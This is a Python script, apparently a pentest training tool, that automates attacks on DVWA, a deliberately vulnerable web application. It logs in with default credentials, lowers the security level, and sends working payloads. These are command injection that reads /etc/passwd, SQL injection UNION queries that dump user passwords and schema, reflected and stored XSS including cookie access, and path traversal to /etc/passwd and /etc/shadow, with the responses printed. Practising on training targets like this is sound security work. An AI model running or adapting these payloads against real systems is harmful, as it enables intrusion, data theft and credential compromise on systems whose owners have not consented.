#!/usr/bin/env python3
"""
DVWA Security Tester
Author  : resapaulusmiki@gmail.com
Version : 1.0
Description: Automated security testing tool for DVWA (Damn Vulnerable Web Application).
             For authorized use only — only run against systems you own or have permission to test.
"""

import sys
import re
import warnings
import requests
from bs4 import BeautifulSoup
from datetime import datetime

warnings.filterwarnings("ignore")
try:
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

# ---------------------------------------------
#  Default config
# ---------------------------------------------
DEFAULT_USER    = "admin"
DEFAULT_PASS    = "password"
DEFAULT_TIMEOUT = 15

COLORS = {
    "green"  : "\033[92m",
    "red"    : "\033[91m",
    "yellow" : "\033[93m",
    "blue"   : "\033[94m",
    "reset"  : "\033[0m",
    "bold"   : "\033[1m",
}

def c(color, text):
    """Colorize terminal output."""
    return f"{COLORS.get(color,'')}{text}{COLORS['reset']}"


# ---------------------------------------------
#  Utilities
# ---------------------------------------------
def module_banner(title):
    line = "-" * 60
    print(f"\n{c('blue', line)}")
    print(f"{c('bold', f'  [*] {title}')}")
    print(c('blue', line))

def status(ok, msg):
    mark = c("green", "[+]") if ok else c("red", "[-]")
    print(f"  {mark} {msg}")

def warn(msg):
    print(c("yellow", f"  [!] {msg}"))

def fetch_token(sess, url):
    """Fetch CSRF user_token from page if present."""
    try:
        r = sess.get(url, verify=False, timeout=DEFAULT_TIMEOUT)
        m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([0-9a-f]+)", r.text)
        return r, (m.group(1) if m else None)
    except requests.exceptions.RequestException:
        class Failed:
            text = ""
            status_code = "FAILED"
            url = url
        return Failed(), None

def send(sess, method, url, **kwargs):
    """HTTP request wrapper with error handling."""
    kwargs.setdefault("verify", False)
    kwargs.setdefault("timeout", DEFAULT_TIMEOUT)
    try:
        if method == "GET":
            return sess.get(url, **kwargs)
        return sess.post(url, **kwargs)
    except requests.exceptions.RequestException as e:
        class Failed:
            status_code = type(e).__name__
            text = ""
            url = url
        return Failed()

def extract_output(html, limit=800):
    """Extract text from vulnerable code area or body."""
    soup = BeautifulSoup(html, "html.parser")
    area = (
        soup.find("div", class_="vulnerable_code_area") or
        soup.find("pre") or
        soup.body or
        soup
    )
    text = area.get_text("\n", strip=True) if area else ""
    return text[:limit]


# ---------------------------------------------
#  Module 1 - Login & Set Security
# ---------------------------------------------
def login(sess, base, user, passwd):
    module_banner("LOGIN")
    r, tok = fetch_token(sess, f"{base}/login.php")
    data = {"username": user, "password": passwd, "Login": "Login"}
    if tok:
        data["user_token"] = tok
    r = send(sess, "POST", f"{base}/login.php", data=data, allow_redirects=True)
    ok = "logout" in r.text.lower() or "login.php" not in r.url
    status(ok, f"Logged in as '{user}' -> HTTP {r.status_code}")
    if not ok:
        warn("Login failed. Check credentials or target URL.")
        sys.exit(1)

def set_security_low(sess, base):
    r, tok = fetch_token(sess, f"{base}/security.php")
    d = {"security": "low", "seclev_submit": "Submit"}
    if tok:
        d["user_token"] = tok
    send(sess, "POST", f"{base}/security.php", data=d)
    status(True, "Security level set to 'low'")


# ---------------------------------------------
#  Module 2 - Command Injection
# ---------------------------------------------
def test_command_injection(sess, base):
    module_banner("COMMAND INJECTION  (/vulnerabilities/exec/)")
    url = f"{base}/vulnerabilities/exec/"
    payloads = [
        "127.0.0.1;id",
        "127.0.0.1;uname -a",
        "127.0.0.1;cat /etc/passwd | head -5",
        "127.0.0.1;hostname",
        "127.0.0.1;ls /var/www/html",
    ]
    for payload in payloads:
        r, tok = fetch_token(sess, url)
        data = {"ip": payload, "Submit": "Submit"}
        if tok:
            data["user_token"] = tok
        r = send(sess, "POST", url, data=data)
        blocked = r.status_code in ("400", 400)
        print(f"\n  {c('yellow','Payload:')} {payload}  (HTTP {r.status_code})")
        if blocked:
            warn("Blocked by WAF/filter")
        else:
            output = extract_output(r.text, 500)
            if output:
                print(c("green", "  +- Response ----------------------"))
                for line in output.split("\n"):
                    print(f"  | {line}")
                print(c("green", "  +---------------------------------"))


# ---------------------------------------------
#  Module 3 - SQL Injection
# ---------------------------------------------
def test_sqli(sess, base):
    module_banner("SQL INJECTION  (/vulnerabilities/sqli/)")
    url = f"{base}/vulnerabilities/sqli/"
    payloads = [
        ("Error-based",    "1'"),
        ("Boolean bypass", "1' OR '1'='1"),
        ("UNION dump users", "%' UNION SELECT user, password FROM users #"),
        ("UNION dump all",   "' UNION SELECT table_name, column_name FROM information_schema.columns #"),
    ]
    for name, payload in payloads:
        r = send(sess, "GET", url, params={"id": payload, "Submit": "Submit"})
        blocked = r.status_code in ("400", 400)
        print(f"\n  {c('yellow', name)}: {payload}  (HTTP {r.status_code})")
        if blocked:
            warn("Blocked by WAF/filter")
        else:
            output = extract_output(r.text, 700)
            if output:
                for line in output.split("\n")[:15]:
                    print(f"    {line}")


# ---------------------------------------------
#  Module 4 - Cross-Site Scripting (XSS)
# ---------------------------------------------
def test_xss(sess, base):
    module_banner("CROSS-SITE SCRIPTING  (/vulnerabilities/xss_r/ & xss_s/)")

    # Reflected XSS
    print(f"\n  {c('yellow','Reflected XSS:')}")
    url_r = f"{base}/vulnerabilities/xss_r/"
    payloads_r = [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>",
        '"><svg onload=alert(1)>',
    ]
    for p in payloads_r:
        r = send(sess, "GET", url_r, params={"name": p})
        reflected = p in r.text if r.text else False
        print(f"    {'[+ VULNERABLE]' if reflected else '[x Filtered]'}  payload={p[:50]}")

    # Stored XSS
    print(f"\n  {c('yellow','Stored XSS:')}")
    url_s = f"{base}/vulnerabilities/xss_s/"
    _, tok = fetch_token(sess, url_s)
    payload_s = "<script>alert('XSS_STORED')</script>"
    data = {
        "txtName"   : "tester",
        "mtxMessage": payload_s,
        "btnSign"   : "Sign Guestbook",
    }
    if tok:
        data["user_token"] = tok
    r = send(sess, "POST", url_s, data=data)
    stored = payload_s in r.text if r.text else False
    status(stored, f"Stored XSS {'payload saved successfully' if stored else 'blocked/encoded'}")


# ---------------------------------------------
#  Module 5 - File Inclusion (LFI)
# ---------------------------------------------
def test_file_inclusion(sess, base):
    module_banner("FILE INCLUSION  (/vulnerabilities/fi/)")
    url = f"{base}/vulnerabilities/fi/"
    paths = [
        "/etc/passwd",
        "/etc/issue",
        "/proc/version",
        "../../../../../../etc/passwd",
        "../../../../../../etc/shadow",
    ]
    for page in paths:
        r = send(sess, "GET", url, params={"page": page})
        leaked = any(k in r.text for k in ["root:", "Linux version", "Ubuntu", "Debian", "GNU"])
        code = r.status_code
        label = c("green", "+ LEAKED") if leaked else "x Safe/Blocked"
        print(f"  [{label}]  {page}  (HTTP {code})")
        if leaked:
            output = extract_output(r.text, 400)
            for line in output.split("\n")[:8]:
                print(f"      {line}")


# ---------------------------------------------
#  Entry Point
# ---------------------------------------------
def main():
    print(c("bold", "\n" + "="*60))
    print(c("bold", "       DVWA Security Tester  v1.0"))
    print(c("bold", f"       Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"))
    print(c("bold", "="*60))
    print(c("yellow", "  [!] Authorized use only — your own systems or with permission!\n"))

    # -- Target URL --
    if len(sys.argv) >= 2:
        base = sys.argv[1].rstrip("/")
    else:
        base = input("  Enter DVWA target URL (e.g. http://127.0.0.1): ").strip().rstrip("/")

    # -- Credentials --
    user_in = input(f"  Username [{DEFAULT_USER}]: ").strip() or DEFAULT_USER
    pass_in = input(f"  Password [{DEFAULT_PASS}]: ").strip() or DEFAULT_PASS

    # -- Module selection --
    print("""
  Attack Menu:
    1. Command Injection
    2. SQL Injection
    3. Cross-Site Scripting (XSS)
    4. File Inclusion (LFI)
    5. All modules
    0. Exit
""")
    choice = input("  Choice [5]: ").strip() or "5"
    if choice == "0":
        print("  Exiting.")
        sys.exit(0)

    # -- Start session --
    sess = requests.Session()
    sess.headers["User-Agent"] = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    )

    login(sess, base, user_in, pass_in)
    set_security_low(sess, base)

    modules = {
        "1": test_command_injection,
        "2": test_sqli,
        "3": test_xss,
        "4": test_file_inclusion,
    }

    if choice == "5":
        for fn in modules.values():
            fn(sess, base)
    elif choice in modules:
        modules[choice](sess, base)
    else:
        warn("Invalid choice.")

    print(f"\n{c('blue','-'*60)}")
    print(c("green", "  [+] Testing complete."))
    print(c("blue", "-"*60 + "\n"))


if __name__ == "__main__":
    main()
